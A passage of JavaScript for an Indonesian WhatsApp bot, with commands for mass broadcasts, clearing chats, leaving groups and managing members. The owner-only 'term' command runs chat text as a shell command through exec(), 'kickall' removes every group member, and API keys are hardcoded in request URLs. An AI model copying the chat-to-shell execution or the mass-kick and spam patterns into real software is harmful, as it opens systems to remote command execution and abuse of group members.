					'Suksess broadcast')
			}
			break
				case 'tobc':
				if (!isOwner && !mek.key.fromMe) return reply('KHUSUS OWNER')
					anu = await varo.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await varo.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							varo.sendMessage(_.jid, buff, audio, { quoted: ftrol })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await varo.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							varo.sendMessage(_.jid, buff, sticker, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          reply(`Command untuk memberitahu seluruh kontak/grup yang ada di bot\n\nExample: ${prefix}tobc (Reply sticker/audio)`)
							}
					break
			/*        case 'bcbutton':
					varo.updatePresence(from, Presence.composing)
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('Teksnya?')
					anu = await varo.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await varo.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							varo.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await varo.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							varo.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await varo.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							varo.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
							//sendMess(_.jid, `${body.slice(4)}`)
buttons = [{buttonId: `menu`, buttonText: {displayText: '⎙ MENU DISNI'}, type: 1},{buttonId: `owner`, buttonText: {displayText: 'PEMBUAT BOT'}, type: 1}]
const btnbc = {
    contentText: `${body.slice(4)}`,
    footerText: 'Broadcast varo Teknologi © 2021',
    buttons: buttons,
    headerType: 1
}
await varo.sendMessage(_.jid, btnbc, MessageType.buttonsMessage, {quoted: mek})
						}
						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)
					}
					break*/
		case 'clearall':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			anu = await varo
				.chats.all()
			varo
				.setMaxListeners(
					25)
			for (let _ of anu) {
				varo
					.deleteChat(
						_.jid)
			}
			reply(
				'Sukses delete all chat :)')
			break
		case 'term':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			if (!q) return
			exec(q, (err,
				stdout) => {
				if (err)
					return reply(
						`${err}`
						)
				if (
					stdout) {
					reply
						(
							stdout)
				}
			})
			break

		case 'shutdown':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			reply(`Bye...`)
			await sleep(3000)
			process.exit()
			break
		case 'start':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			reply(
				`OTEWE MENGHIDUPKAN MESIN😗`)
			await sleep(3000)
			process.exit()
			break
		case 'restart':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			reply(mess.wait)
			exec(`pm2 restart main.js`)
			reply(
				'_Restarting Bot Success_')
			break
		case 'leaveall':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			let totalgroup =
				varo.chats
				.array.filter(
					u => u.jid
					.endsWith(
						'@g.us')
					).map(u => u
					.jid)
			for (let id of
					totalgroup) {
				sendMess(id,
					'Byee',
					null)
				await sleep(
					3000)
				varo
					.groupLeave(
						id)
			}
			break
			//------------------< G R U P >-------------------
		case 'linkgc':
		case 'linkgroup':
		case 'grouplink':
			if (isBanned) return reply(mess.baned)
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			linkgc =
				await varo
				.groupInviteCode(
					from)
			yeh =
				`https://chat.whatsapp.com/${linkgc}`
			varo.sendMessage(
				from, yeh,
				text, {
					quoted: mek
				})
			break
		case 'kick':
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
					if (!
						isBotGroupAdmins
						) return reply(mess.only.Badmin)
mauxkick = args[0].replace('@', '')
for (let i of
						_premium) {
if ((i.id).includes(`${mauxkick}@s.whatsapp.net`)) return varo.sendMessage(from, `Suatu percubaan yang mantab`, text, {quoted: mek})
}
			kick(from,
				mentionUser)
			break
		case 'add':
			if (!isGroupAdmins)
			return reply(
				mess
				.only
				.admin)
			if (!
				isBotGroupAdmins
				) return reply(mess.only.Badmin)
			if (mek.message
				.extendedTextMessage ===
				null || mek
				.message
				.extendedTextMessage ===
				undefined) {
				entah = arg
					.split("|")[
						0]
				entah = entah
					.replace(
						new RegExp(
							"[()+-/ +/]",
							"gi"
							),
						"")
				entah =
					`${entah}@s.whatsapp.net`
				varo.groupAdd(
					from, [
						entah
					])
			} else {
				entah = mek
					.message
					.extendedTextMessage
					.contextInfo
					.participant
				varo.groupAdd(
					from, [
						entah
					])
			}
			break
			case 'xkick':
				if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
						if (!
							isBotGroupAdmins
							) return reply(mess.only.Badmin)
                               mauxkick = args[0].replace('@', '')
				for (let i of
						_premium) {
if ((i.id).includes(`${mauxkick}@s.whatsapp.net`)) return varo.sendMessage(from, `Suatu percubaan yang mantab`, text, {quoted: mek})
}
				kick(from,
					mentionUser)
				break
			case 'xadd':
				if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
				if (!
					isBotGroupAdmins
					) return reply(mess.only.Badmin)
				if (mek.message
					.extendedTextMessage ===
					null || mek
					.message
					.extendedTextMessage ===
					undefined) {
					entah = arg
						.split("|")[
							0]
					entah = entah
						.replace(
							new RegExp(
								"[()+-/ +/]",
								"gi"
								),
							"")
					entah =
						`${entah}@s.whatsapp.net`
					varo.groupAdd(
						from, [
							entah
						])
				} else {
					entah = mek
						.message
						.extendedTextMessage
						.contextInfo
						.participant
					varo.groupAdd(
						from, [
							entah
						])
				}
				break
		/*case 'tahta':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
					)
			reply(mess.wait)
			tahta = args.join(
				" ")
			tahta =
				await getBuffer(
					`https://api.zeks.xyz/api/hartatahta?apikey=apivinz&text=${tahta}`
					)
			varo.sendMessage(
				from, tahta,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break
		case 'kembangapi':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
					)
			reply(mess.wait)
			tahta = args.join(
				" ")
			api =
				await getBuffer(
					`https://api.zeks.me/api/tfire?apikey=apivinz&text=${tahta}`
					)
			varo.sendMessage(
				from, api,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break

		case 'thunder':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
					)
			reply(mess.wait)
			thunder = args.join(
				" ")
			thunder =
				await getBuffer(
					`https://api.zeks.xyz/api/thundertext?apikey=apivinz&text=${thunder}`
					)
			varo.sendMessage(
				from,
				thunder,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break
		case 'blackpink':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
					)
			reply(mess.wait)
			bp = args.join(" ")
			bp = await getBuffer(
				`https://api.zeks.xyz/api/logobp?apikey=apivinz&text=${bp}`
				)
			varo.sendMessage(
				from, bp,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break
		case 'glitch':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (!q) return reply(
				`Example : ${prefix}glitch nama|autor`
				)
			g1 = q.split('|')[0]
			g2 = q.split('|')[1]
			reply(mess.wait)
			glitch =
				await getBuffer(
					`https://api.zeks.xyz/api/gtext?apikey=apivinz&text1=${g1}&text2=${g2}`
					)
			varo.sendMessage(
				from,
				glitch,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break
		case 'marvel':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (!q) return reply(
				`Example : ${prefix}marvel nama|autor`
				)
			m1 = q.split('|')[0]
			m2 = q.split('|')[1]
			reply(mess.wait)
			marvel =
				await getBuffer(
					`https://api.zeks.xyz/api/marvellogo?apikey=apivinz&text1=${m1}&text2=${m2}`
					)
			varo.sendMessage(
				from,
				marvel,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break
		case 'serigala':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (!q) return reply(
				`Example : ${prefix}serigala nama|autor`
				)
			m1 = q.split('|')[0]
			m2 = q.split('|')[1]
			reply(mess.wait)
			serigala =
				await getBuffer(
					`https://api.zeks.me/api/wolflogo?apikey=apivinz&text1=${m1}&text2=${m2}`
					)
			varo.sendMessage(
				from,
				serigala,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break
		case 'kembangapi':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
					)
			reply(mess.wait)
			tahta = args.join(
				" ")
			light =
				await getBuffer(
					`https://api.zeks.me/api/lithgtext?apikey=apivinz&text=${tahta}`
					)
			varo.sendMessage(
				from, light,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break

		case 'light':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
					)
			reply(mess.wait)
			tahta = args.join(
				" ")
			light =
				await getBuffer(
					`https://api.zeks.me/api/lithgtext?apikey=apivinz&text=${tahta}`
					)
			varo.sendMessage(
				from, light,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break
		case 'glitch':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (!q) return reply(
				`Example : ${prefix}glitch nama|autor`
				)
			g1 = q.split('|')[0]
			g2 = q.split('|')[1]
			g3 = q.split('|')[2]
			reply(mess.wait)
			glitch =
				await getBuffer(
					`https://api.zeks.me/api/retro?apikey=apivinz&text1=${g1}&text2=${g2}&text3=${g3}`
					)
			varo.sendMessage(
				from,
				glitch,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break
		case 'asap':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
					)
			reply(mess.wait)
			tahta = args.join(
				" ")
			asap =
				await getBuffer(
					`https://api.zeks.me/api/smoketext?apikey=apivinz&text=${tahta}`
					)
			varo.sendMessage(
				from, asap,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break
		case 'naruto':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
					)
			reply(mess.wait)
			tahta = args.join(
				" ")
			naruto =
				await getBuffer(
					`https://api.zeks.me/api/naruto?apikey=apivinz&text=${tahta}`
					)
			varo.sendMessage(
				from,
				naruto,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break
		case 'breakwall':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
					)
			reply(mess.wait)
			tahta = args.join(
				" ")
			breakwall =
				await getBuffer(
					`https://api.zeks.me/api/breakwall?apikey=apivinz&text=${tahta}`
					)
			varo.sendMessage(
				from,
				breakwall,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break
		case 'gneon':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
					)
			reply(mess.wait)
			tahta = args.join(
				" ")
			gneon =
				await getBuffer(
					`https://api.zeks.me/api/gneon?apikey=apivinz&text=${tahta}`
					)
			varo.sendMessage(
				from, gneon,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break
		case 'bunga':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
					)
			reply(mess.wait)
			tahta = args.join(
				" ")
			kembang =
				await getBuffer(
					`https://api.zeks.me/api/flowertext?apikey=apivinz&text=${tahta}`
					)
			varo.sendMessage(
				from,
				kembang,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break
		case 'silk':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
					)
			reply(mess.wait)
			tahta = args.join(
				" ")
			kaen =
				await getBuffer(
					`https://api.zeks.me/api/silktext?apikey=apivinz&text=${tahta}`
					)
			varo.sendMessage(
				from, kaen,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break
		case 'glow':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
					)
			reply(mess.wait)
			tahta = args.join(
				" ")
			aser =
				await getBuffer(
					`https://api.zeks.me/api/glowtext?apikey=apivinz&text=${tahta}`
					)
			varo.sendMessage(
				from, aser,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break
		case 'pubg':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (!q) return reply(
				`Example : ${prefix}serigala nama|autor`
				)
			m1 = q.split('|')[0]
			m2 = q.split('|')[1]
			reply(mess.wait)
			pbg =
				await getBuffer(
					`https://api.zeks.me/api/pubglogo?apikey=apivinz&text1=${m1}&text2=${m2}`
					)
			varo.sendMessage(
				from, pbg,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break
		case 'fflogo':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (!q) return reply(
				`Example : ${prefix}serigala nama|autor`
				)
			m1 = q.split('|')[0]
			reply(mess.wait)
			eses =
				await getBuffer(
					`https://api.zeks.me/api/epep?apikey=apivinz&text1=${m1}`
					)
			varo.sendMessage(
				from, eses,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break

		case 'comenporno':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (!q) return reply(
				`Example : ${prefix}porno nama|autor`
				)
			m1 = q.split('|')[0]
			m2 = q.split('|')[1]
			reply(mess.wait)
			porno =
				await getBuffer(
					`https://api.zeks.me/api/phub?apikey=apivinz&img=https://1.bp.blogspot.com/-x8KhcOBG-yw/XiU4pi1yWVI/AAAAAAAADBA/gK8tsLyc1lQ808A348IKzDCjf6fUBKONwCLcBGAsYHQ/s1600/cara+buat+foto+profil+di+whatsapp+menjadi+unik.jpg&text1=${m1}&text2=${m2}`
					)
			varo.sendMessage(
				from, porno,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break


		case 'aten':
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
					)
			reply(mess.wait)
			tahta = args.join(
				" ")
			light =
				await getBuffer(
					`https://api.dapuhy.ga/api/photofunia/${command}?text=${tahta}&apikey=vxrobot2k21`
					)
			varo.sendMessage(
				from, light,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break
		case 'einsten':
			if (args.length < 1)
				return reply(
					'*Teks nya mana?*'
					)
			reply(mess.wait)
			tahta = args.join(
				" ")
			light =
				await getBuffer(
					`https://api.dapuhy.ga/api/photofunia/einstein?text=${tahta}&apikey=vxrobot2k21`
					)
			varo.sendMessage(
				from, light,
				image, {
					quoted: mek,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
			break
			case 'fancytext':
				if (args.length < 1) return reply(`Command untuk membuat text dari bermacam font\n\nExample : ${prefix+command} VXROBOT`)
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/fancytext?text=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
teks = anu.result
reply(teks)
break*/
            case 'groupwa':
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (isGroup) return reply(`Command ini hanya untuk private chat!`)
				if (args.length < 1) return reply(`Command untuk mencari link group whatsapp\n\nExample : ${prefix+command} Anime`)	
                    anu = await fetchJson(`https://api.lolhuman.xyz/api/groupwhatsapp?apikey=vxro2k21&query=${q}`)
					anu = anu.result
					hehe = 
					`┌ ◪ *GROUP WHATSAPP*
└ *Search Query:* ${q}\n\n`
									for (let i = 0; i < anu.length; i++) {
										hehe += `───────────────\n
┌ ▷ *Name:* ${anu[i].name}
├ ▷ *Genre:* ${anu[i].genre}
├ ▷ *Link:* ${anu[i].link}\n\n`
									}
				reply(hehe)
				limitAdd(sender,
					limit)
				break
			case 'groupwa2':
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (isGroup) return reply(`Command ini hanya untuk private chat!`)
				if (args.length < 1) return reply(`Command untuk mencari link group whatsapp\n\nExample : ${prefix+command} Anime`)	
                    anu = await fetchJson(`https://api.lolhuman.xyz/api/groupwhatsapp2?apikey=vxro2k21&query=${q}`)
					anu = anu.result
					hehe = 
					`┌ *GROUP WHATSAPP 2*
└ *Search Query:* ${q}\n\n`
									for (let i = 0; i < anu.length; i++) {
										hehe += `───────────────\n
┌ ▷ *Name:* ${anu[i].title}
├ ▷ *Link:* ${anu[i].link}\n\n`
									}
				reply(hehe)
				limitAdd(sender,
					limit)
				break
		case 'promote':
			if (isBanned) return reply(mess.baned)
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
					if (!
						isBotGroupAdmins
						) return reply(mess.only.Badmin)
			if (mek.message
				.extendedTextMessage ===
				null || mek
				.message
				.extendedTextMessage ===
				undefined)
				return;
			if (mek.message
				.extendedTextMessage
				.contextInfo
				.participant ===
				undefined) {
				entah = mek
					.message
					.extendedTextMessage
					.contextInfo
					.mentionedJid
				if (entah
					.length > 0
					) {
					var mems_ids = []
					for (let ids of
							entah) {
						mems_ids
							.push(
								ids
								)
					}
					varo
						.groupMakeAdmin(
							from,
							mems_ids
							)
				} else {
					varo
						.groupMakeAdmin(
							from,
							entah
							)
				}
			} else {
				entah = mek
					.message
					.extendedTextMessage
					.contextInfo
					.participant
				varo
					.groupMakeAdmin(
						from, [
							entah
						])
			}
			break
		case 'demote':
			if (isBanned) return reply(mess.baned)
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
					if (!
						isBotGroupAdmins
						) return reply(mess.only.Badmin)
			if (mek.message
				.extendedTextMessage ===
				null || mek
				.message
				.extendedTextMessage ===
				undefined)
				return;
			if (mek.message
				.extendedTextMessage
				.contextInfo
				.participant ===
				undefined) {
				entah = mek
					.message
					.extendedTextMessage
					.contextInfo
					.mentionedJid
				if (entah
					.length > 0
					) {
					var mems_ids = []
					for (let ids of
							entah) {
						mems_ids
							.push(
								ids
								)
					}
					varo
						.groupDemoteAdmin(
							from,
							mems_ids
							)
				} else {
					varo
						.groupDemoteAdmin(
							from,
							[entah[
								0]]
							)
				}
			} else {
				entah = mek
					.message
					.extendedTextMessage
					.contextInfo
					.participant
				varo
					.groupDemoteAdmin(
						from, [
							entah
						])
			}
			break
			case 'xpromote':
				if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
						if (!
							isBotGroupAdmins
							) return reply(mess.only.Badmin)
				if (mek.message
					.extendedTextMessage ===
					null || mek
					.message
					.extendedTextMessage ===
					undefined)
					return;
				if (mek.message
					.extendedTextMessage
					.contextInfo
					.participant ===
					undefined) {
					entah = mek
						.message
						.extendedTextMessage
						.contextInfo
						.mentionedJid
					if (entah
						.length > 0
						) {
						var mems_ids = []
						for (let ids of
								entah) {
							mems_ids
								.push(
									ids
									)
						}
						varo
							.groupMakeAdmin(
								from,
								mems_ids
								)
					} else {
						varo
							.groupMakeAdmin(
								from,
								entah
								)
					}
				} else {
					entah = mek
						.message
						.extendedTextMessage
						.contextInfo
						.participant
					varo
						.groupMakeAdmin(
							from, [
								entah
							])
				}
				break
			case 'xdemote':
				if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
						if (!
							isBotGroupAdmins
							) return reply(mess.only.Badmin)
				if (mek.message
					.extendedTextMessage ===
					null || mek
					.message
					.extendedTextMessage ===
					undefined)
					return;
				if (mek.message
					.extendedTextMessage
					.contextInfo
					.participant ===
					undefined) {
					entah = mek
						.message
						.extendedTextMessage
						.contextInfo
						.mentionedJid
					if (entah
						.length > 0
						) {
						var mems_ids = []
						for (let ids of
								entah) {
							mems_ids
								.push(
									ids
									)
						}
						varo
							.groupDemoteAdmin(
								from,
								mems_ids
								)
					} else {
						varo
							.groupDemoteAdmin(
								from,
								[entah[
									0]]
								)
					}
				} else {
					entah = mek
						.message
						.extendedTextMessage
						.contextInfo
						.participant
					varo
						.groupDemoteAdmin(
							from, [
								entah
							])
				}
				break
		case 'setnamegc':
		case 'setgrupname':
		case 'setgrupname':
			if (isBanned) return reply(mess.baned)
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (!
				isBotGroupAdmins
				) return reply(mess.only.Badmin)
			if (args.length ==
				0) return reply(
					`Command untuk mengubah nama grup\n\nExample : ${prefix+command} VXROBOT`
				)
			varo
				.groupUpdateSubject(
					from, q)
				.then((res) =>
					reply(
						jsonformat(
							res)
						))
				.catch((err) =>
					reply(
						jsonformat(
							err)
						))
			break
		case 'setdesc':
			if (isBanned) return reply(mess.baned)
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (!
				isBotGroupAdmins
				) return reply(mess.only.Badmin)
			if (args.length ==
				0) return reply(
					`Command untuk mengubah deskripsi grup\n\nExample : ${prefix+command} Deskripsi`
				)
			varo
				.groupUpdateDescription(
					from, q)
				.then((res) =>
					reply(
						jsonformat(
							res)
						))
				.catch((err) =>
					reply(
						jsonformat(
							err)
						))
			break
		case 'setppgroup':
		case 'setppgrup':
			if (isBanned) return reply(mess.baned)
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (!
				isBotGroupAdmins
				) return reply(mess.only.Badmin)
			if (isQuotedImage) {
				let encmedia =
					isQuotedImage ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
						)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				let media =
					await varo
					.downloadMediaMessage(
						encmedia
						)
				varo
					.updateProfilePicture(
						from,
						media)
					.then((
						res) =>
						reply(
							jsonformat(
								res
								)
							))
					.catch((
						err) =>
						reply(
							jsonformat(
								err
								)
							))
			} else {
				reply(`Command untuk mengubah photo profile group\n\nExample : ${prefix+command} (Reply Image)`)
			}
			break
		case 'me':
		case 'profile':
			let Levelnye = level
				.getLevelingLevel(
					sender,
					_level)
			let Xpluu = level
				.getLevelingXp(
					sender,
					_level)
			let requiredXplu =
				10 * Math.pow(
					Levelnye, 2
					) + 50 *
				Levelnye + 100
			varo
				.updatePresence(
					from,
					Presence
					.composing)
			try {
				profil =
					await varo
					.getProfilePicture(
						`${sender.split('@')[0]}@s.whatsapp.net`
						)
			} catch {
				profil =
					errorImg
			}
			thu = await varo
				.getStatus(
					`${sender.split('@')[0]}@s.whatsapp.net`,
					MessageType
					.text)
			me = varo.user
			uptime = process
				.uptime()
			profile =
				`*<+> Name:* @${sender.split('@')[0]}\n*<+> Bio:* ${thu.status}\n\n▷ Status : *${isOwner ? 'OWNER' : isPremium ? 'Premium' : 'Free'}*\n▷ Banned : *${isBanned ? 'True':'False'}*\n▷ Admin : *${isGroupAdmins ? 'True' : 'False'}*\n\n──────────❃──────────\n\nProgress:\n▷ Level : *${Levelnye}*\n▷ XP : *${Xpluu} / ${requiredXplu}*`
			buff =
				await getBuffer(
					profil)
			varo.sendMessage(
				from, buff,
				image, {contextInfo:{mentionedJid:[sender]},
					quoted: freply,
					caption: profile
				})
			break
		case 'getprofile':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			maublok = args[0].replace('@','')
			let Leveluser = level
				.getLevelingLevel(
					`${maublok}@s.whatsapp.net`,
					_level)
			let XpUser = level
				.getLevelingXp(
					`${maublok}@s.whatsapp.net`,
					_level)
			let xpnyauser =
				10 * Math.pow(
					Leveluser, 2
					) + 50 *
				Leveluser + 100
			varo
				.updatePresence(
					from,
					Presence
					.composing)
			try {
				profil =
					await varo
					.getProfilePicture(
						`${maublok}@s.whatsapp.net`
						)
			} catch {
				profil =
					errorImg
			}
			thu = await varo
				.getStatus(
					`${maublok}@s.whatsapp.net`,
					MessageType
					.text)
			Adminuser =
				groupAdmins
				.includes(`${maublok}@s.whatsapp.net`) ||
				false
			Owneruser =
				ownerNumber
				.includes(`${maublok}@s.whatsapp.net`)
			Premuser =premium
				.checkPremiumUser(
					`${maublok}@s.whatsapp.net`, _premium
					)
			Banuser = banned.includes(`${maublok}@s.whatsapp.net`)
			me = varo.user
			uptime = process
				.uptime()
			profile =
				`*<+> Name:* @${maublok}\n*<+> Bio:* ${thu.status}\n\n▷ Status : *${Owneruser ? 'OWNER' : Premuser ? 'Premium' : 'Free'}*\n▷ Banned : *${Banuser ? 'True':'False'}*\n▷ Admin : *${Adminuser ? 'True' : 'False'}*\n\n──────────❃──────────\n\nProgress:\n▷ Level : *${Leveluser}*\n▷ XP : *${XpUser} / ${xpnyauser}*`
			buff =
				await getBuffer(
					profil)
			varo.sendMessage(
				from, buff,
				image, {contextInfo:{mentionedJid:[`${maublok}@s.whatsapp.net`]},
					quoted: mek,
					caption: profile
				})
			break
		case 'getbio':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			maublok = args[0].replace('@','')
			thu = await varo
			.getStatus(
				`${maublok}@s.whatsapp.net`,
				MessageType
				.text)
			varo.sendMessage(from, `*<+> Name:* @${maublok}\n*<+> Bio:* ${thu.status}`,text,{contextInfo:{mentionedJid:[`${maublok}@s.whatsapp.net`]}})
			break
		case 'afk':
			if (isBanned) return reply(mess.baned)
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (isAfkOn)
			return reply(
					'Sudah afk'
					)
			const reason = q ?
				q : '-'
			afk.addAfkUser(
				sender,
				time,
				reason, _afk
				)
			const aluty =
				`@${sender.split('@')[0]} is Now AFK (Away From Keyboard)`
			reply(aluty)
			break
		case 'infogrup':
		case 'grupinfo':
		case 'groupinfo':
			if (isBanned) return reply(mess.baned)
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			try {
				var pic =
					await varo
					.getProfilePicture(
						from)
			} catch {
				var pic =
					'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
			}
			let ingfo =
				`*| GROUP-INFO |*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner :* @${groupMetadata.owner.split('@')[0]}\n*Total Admin :* ${groupAdmins.length}\n*Total Peserta :* ${groupMembers.length}\n*AntiLink :* ${isAntiLink ? 'Aktif' : 'Mati'}\n*Desc :* \n${groupMetadata.desc}`
			varo.sendMessage(
				from,
				await getBuffer(
					pic),
				image, {
					quoted: mek,
					caption: ingfo,
					contextInfo: {
						"mentionedJid": [
							groupMetadata
							.owner
							.replace(
								'@c.us',
								'@s.whatsapp.net'
								)
						]
					}
				})
			break
		case 'tagall':
			if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)

			let arr = [];
			let txti =
				`*[ TAG ALL ]*\n\n${q ? q : ''}\n\n`
			for (let i of
					groupMembers) {
				txti +=
					`=> @${i.jid.split("@")[0]}\n`
				arr.push(i.jid)
			}
			mentions(txti, arr,
				true)
			break
		case 'kickall': // Anti Banned
			if (!isOwner)
				return reply(
					mess
					.only
					.owner)
			for (let i of
					groupMembers) {
				await kickMember
					(from, [i
						.jid
					])
			}
			break
		case 'leave':
